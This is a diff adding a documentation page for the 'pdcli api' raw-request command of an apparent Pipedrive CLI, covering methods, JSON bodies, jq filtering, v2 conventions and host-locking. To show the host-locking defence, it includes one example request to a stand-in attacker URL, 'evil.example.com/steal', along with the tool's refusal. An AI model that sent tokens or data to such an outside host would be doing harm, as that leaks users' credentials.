@@ -1,0 +1,89 @@
+---
+title: The raw api escape hatch
+description: Call any Pipedrive v1 or v2 endpoint directly — host-locked to your own company domain so a mistyped URL can't leak your token.
+---
+
+`pdcli api` is the escape hatch for anything the typed commands don't wrap yet. It sends a
+raw request to a path you give and prints the JSON response, while still using your stored
+credentials and the same rate-limit handling as every other command.
+
+```bash
+pdcli api <METHOD> <path> [--body ...]
+```
+
+`METHOD` is one of `GET`, `POST`, `PUT`, `PATCH`, `DELETE`. The path can target **either
+API version** — v1 and v2 both work:
+
+```bash
+pdcli api GET /api/v2/deals
+pdcli api GET /api/v1/currencies
+pdcli api POST /api/v2/deals --body '{"title":"New deal"}'
+pdcli api DELETE /api/v1/webhooks/1
+```
+
+## Host-locking
+
+The request is **locked to your own Pipedrive host** — the `{company}.pipedrive.com` origin
+from your token-mode login, or the `api_domain` returned by OAuth. pdcli resolves the path
+against that origin and refuses anything that resolves elsewhere, including **other
+`*.pipedrive.com` subdomains**. A mistyped, hallucinated, or attacker-supplied absolute URL
+can't be used to exfiltrate your token. The refusal exits 78:
+
+```bash
+pdcli api GET https://evil.example.com/steal
+```
+
+```text
+Error: Refusing to send request outside your Pipedrive company host (https://acme.pipedrive.com): https://evil.example.com
+```
+
+There is no generic `api.pipedrive.com` data host — always use your company origin via a
+relative path like `/api/v2/deals`.
+
+## Request bodies
+
+For `POST`, `PUT`, and `PATCH`, supply a JSON body with `--body`, which takes either an
+inline string or an `@file` path (`GET` and `DELETE` ignore it):
+
+```bash
+pdcli api POST /api/v2/deals --body '{"title":"Inline JSON"}'   # inline string
+pdcli api POST /api/v2/deals --body @new-deal.json              # @file
+```
+
+The body is parsed as JSON before sending; invalid JSON fails before any request.
+
+## Filtering with `--jq`
+
+The response is printed as pretty JSON by default. Add `--jq` to filter it with a jq
+expression — handy for pulling one value out of a raw call:
+
+```bash
+pdcli api GET /api/v2/pipelines --jq '.data[] | {id, name}'
+```
+
+## v2 notes
+
+When you hit v2 endpoints directly, remember the v2 conventions:
+
+- **Use `PATCH` for updates**, not `PUT` — v2 update semantics are partial (only the fields
+  you send change).
+- **Bodies are JSON only.** v2 doesn't take form-encoded data.
+- Lists use **cursor** pagination (`cursor`/`limit`, `limit` max 500); v1 lists use
+  **offset** pagination (`start`/`limit`). See
+  [How pdcli talks to Pipedrive](/pdcli/concepts/api-model/). `pdcli api` makes a single
+  request — it does **not** auto-paginate — so pass `cursor`/`start` yourself for more
+  pages.
+
+## When to reach for it
+
+Use the typed commands when they exist — they resolve custom-field names, format tables,
+and paginate for you. Reach for `pdcli api` when you need an endpoint pdcli doesn't wrap
+yet, for example:
+
+- **Currencies** — `GET /api/v1/currencies`
+- **Lead labels** — `GET /api/v1/leadLabels`
+- **Recents / changelog** — `GET /api/v1/recents`
+- Any other v1/v2 endpoint, including newer ones, against your own host.
+
+Everything else carries over: errors map to the same [exit codes](/pdcli/automation/exit-codes/),
+429s back off, and the token is never printed.
